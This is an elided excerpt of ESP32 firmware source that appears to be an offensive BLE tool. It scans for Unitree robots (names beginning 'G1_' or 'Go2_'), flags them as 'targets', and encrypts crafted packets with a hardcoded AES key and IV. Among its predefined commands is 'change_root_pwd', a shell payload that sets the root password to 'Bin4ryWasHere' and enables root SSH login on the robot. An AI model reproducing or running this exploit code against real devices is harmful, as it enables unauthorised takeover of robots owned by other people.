...
const uint8_t AES_KEY[16] = {0xdf, 0x98, 0xb7, 0x15, 0xd5, 0xc6, 0xed, 0x2b,
                             0x25, 0x81, 0x7b, 0x6f, 0x25, 0x54, 0x12, 0x4a};

const uint8_t AES_IV[16] = {0x28, 0x41, 0xae, 0x97, 0x41, 0x9c, 0x29, 0x73,
...
std::vector<Command> predefinedCmds = {
    ...
    {"change_root_pwd",
     "echo 'root:Bin4ryWasHere'|chpasswd;sed -i 's/^#*\\s*PermitRootLogin.*/PermitRootLogin yes/' "
     "/etc/ssh/sshd_config;",
...
void setup() {
    ...
    debugPrint("Chip: " + String(ESP.getChipModel()) + " Rev " + String(ESP.getChipRevision()),
               "BOOT");
    ...
    if (continuousScanning) {
        ...
        if (currentTime - lastScanTime >= CONTINUOUS_SCAN_INTERVAL) {
            ...
            if (discoveredDevices.size() > 0) {
                infoPrint("Found " + String(discoveredDevices.size()) +
                          " Unitree device(s) so far");
            } else {
...
std::vector<uint8_t> encryptData(const std::vector<uint8_t>& data) {
    ...
    mbedtls_aes_crypt_cfb128(&aes_ctx, MBEDTLS_AES_ENCRYPT, data.size(), &offset, iv_copy,
...
std::vector<uint8_t> decryptData(const std::vector<uint8_t>& data) {
    ...
    mbedtls_aes_init(&aes_ctx);
    mbedtls_aes_setkey_enc(&aes_ctx, AES_KEY, 128);
    mbedtls_aes_crypt_cfb128(&aes_ctx, MBEDTLS_AES_DECRYPT, data.size(), &offset, iv_copy,
...
std::vector<uint8_t> createPacket(uint8_t instruction, const std::vector<uint8_t>& dataBytes) {
    ...
    debugPrint("Total packet size before encryption: " + String(fullData.size()) + " bytes",
               "PACKET");
...
bool genericResponseValidator(const std::vector<uint8_t>& response, uint8_t expectedInstruction) {
    ...
    debugPrint("Checking length: packet=" + String(response.size()) +
                   ", header=" + String(response[1]),
               "VALIDATE");
    if (response.size() != response[1]) {
        errorPrint("Packet length mismatch: Expected " + String(response[1]) + ", Got " +
                   String(response.size()));
        return false;
    }

    debugPrint("Checking instruction: got=0x" + String(response[2], HEX) + ", expected=0x" +
                   String(expectedInstruction, HEX),
               "VALIDATE");
    if (response[2] != expectedInstruction) {
        errorPrint("Instruction mismatch: Expected " + String(expectedInstruction) + ", Got " +
                   String(response[2]));
        return false;
    }
    ...
    debugPrint("Checking checksum: calculated=0x" + String(expectedChecksum, HEX) +
                   ", received=0x" + String(response[response.size() - 1], HEX),
               "VALIDATE");
    ...
    debugPrint("Checking status byte: response[3]=0x" + String(response[3], HEX) +
                   " (expecting 0x01)",
               "VALIDATE");
...
class MyAdvertisedDeviceCallbacks : public NimBLEAdvertisedDeviceCallbacks {
    void onResult(NimBLEAdvertisedDevice* advertisedDevice) {
        ...
        if (deviceName.length() > 0) {
            snprintf(bleMsg, sizeof(bleMsg), "BLE DEVICE: %s (%s) RSSI: %d dBm", deviceName.c_str(),
        ...
        if (deviceName.startsWith("G1_") || deviceName.startsWith("Go2_") ||
            ...
            char targetMsg[200];
            snprintf(targetMsg, sizeof(targetMsg),
                     "*** UNITREE TARGET DETECTED ***: %s (%s) RSSI: %d dBm", deviceName.c_str(),
                     deviceAddress.c_str(), rssi);
            successPrint(String(targetMsg));

#if ENABLE_WEB_INTERFACE
            // IMMEDIATE web UI update - don't wait for full processing!
            String immediateLog = "TARGET FOUND: " + deviceName + " (" + deviceAddress +
                                  ") RSSI: " + String(rssi) + " dBm<br>";
            ...
            // Update existing entry with complete UUID info (device was already added immediately
            // above)
            bool found = false;
            for (auto& d : discoveredDevices) {
            ...
            if (!found) {
                ...
                // styledPrint("Updated: " + deviceName + " (" + device.address + ") RSSI: " +
                // String(device.rssi));
...
void stopContinuousScanning() {
    ...
    successPrint("Continuous scanning stopped. Found " + String(discoveredDevices.size()) +
                 " total Unitree target(s)");
}
...
void scanForDevices() {
    ...
    if (discoveredDevices.size() > 0) {
        successPrint("Scan complete. Found " + String(discoveredDevices.size()) +
                     " Unitree target(s)");

        // Summary of discovered devices
        for (int i = 0; i < discoveredDevices.size(); i++) {
            infoPrint("Target " + String(i + 1) + ": " + discoveredDevices[i].name + " (" +
                      discoveredDevices[i].address +
                      ") RSSI: " + String(discoveredDevices[i].rssi) + " dBm");
        }
    } else {
...
void loadRecentDevices() {
    if (!SPIFFS.exists("/recent_devices.json"))
        return;
